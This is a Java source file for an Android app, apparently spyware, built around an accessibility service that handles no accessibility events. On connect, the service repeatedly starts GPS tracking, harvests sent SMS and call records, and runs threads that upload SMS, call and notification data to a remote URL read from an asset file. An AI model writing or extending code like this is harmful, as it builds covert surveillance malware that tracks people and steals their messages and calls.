package com.lurkerx.gpsjob;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.lurkerx.gpsjob.calljob.CallService;
import com.lurkerx.gpsjob.calljob.CallUploader;
import com.lurkerx.gpsjob.smsjob.SmsFetch;
import com.lurkerx.gpsjob.smsjob.SmsUploader;
import com.lurkerx.gpsjob.notifjob.NotifUploader;

public class AppAccessibilityService extends AccessibilityService {

    private static final String TAG = "AppAccessibilityService";

    private Handler handler;
    private Runnable gpsCycle;
    private Runnable callCycle;
    private Runnable smsCycle;

    private Thread smsThread;
    private Thread callThread;
    private Thread notifThread;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility service connected");

        Context context = getApplicationContext();
        String url = AssetUrlProvider.getUrl(context);

        // === GPS Service cycle ===
        handler = new Handler(Looper.getMainLooper());
        gpsCycle = new Runnable() {
            @Override
            public void run() {
                Intent i = new Intent(context, GpsService.class);
                context.startForegroundService(i);
                handler.postDelayed(this, 10 * 60_000L);
            }
        };
        handler.post(gpsCycle);

        // === SMS cycle and upload loop ===
        smsCycle = new Runnable() {
            @Override
            public void run() {
                new SmsFetch(context).fetchSentSms();
                handler.postDelayed(this, 5*60_000);
            }
        };
        handler.post(smsCycle);
        smsThread = new Thread(() -> {
            try {
                SmsUploader.uploadLoop(context, url);
            } catch (Exception e) {
                Log.e(TAG, "SMS upload loop error", e);
            }
        }, "SmsUploaderThread");
        smsThread.start();

        // === call upload loop ===
        callCycle = new Runnable() {
            @Override
            public void run() {
                Intent i = new Intent(context, CallService.class);
                context.startForegroundService(i);
                handler.postDelayed(this, 10 * 60_000L);
            }
        };
        handler.post(callCycle);
        callThread = new Thread(() -> {
            try {
                CallUploader.uploadLoop(context, url);
            } catch (Exception e) {
                Log.e(TAG, "Call upload loop error", e);
            }
        }, "CallUploaderThread");
        callThread.start();

        // === notification upload loop ===
        notifThread = new Thread(() -> {
            try {
                NotifUploader.uploadLoop(context, url);
            } catch (InterruptedException e) {
                Log.w(TAG, "Notification upload loop interrupted");
            } catch (Exception e) {
                Log.e(TAG, "Notification upload loop error", e);
            }
        }, "NotifUploaderThread");
        notifThread.start();
    }

    @Override
    public void onDestroy() {
        // cleanup handlers and threads
        if (handler != null && gpsCycle != null) {
            handler.removeCallbacks(gpsCycle);
            handler.removeCallbacks(smsCycle);
            handler.removeCallbacks(callCycle);
        }

        if (smsThread != null && smsThread.isAlive()) {
            smsThread.interrupt();
        }
        if (callThread != null && callThread.isAlive()) {
            callThread.interrupt();
        }

        if (notifThread != null && notifThread.isAlive()) {
            notifThread.interrupt();
        }

        Log.d(TAG, "Accessibility service destroyed, cleaned up");
    }

    @Override
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent event) {
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }
}
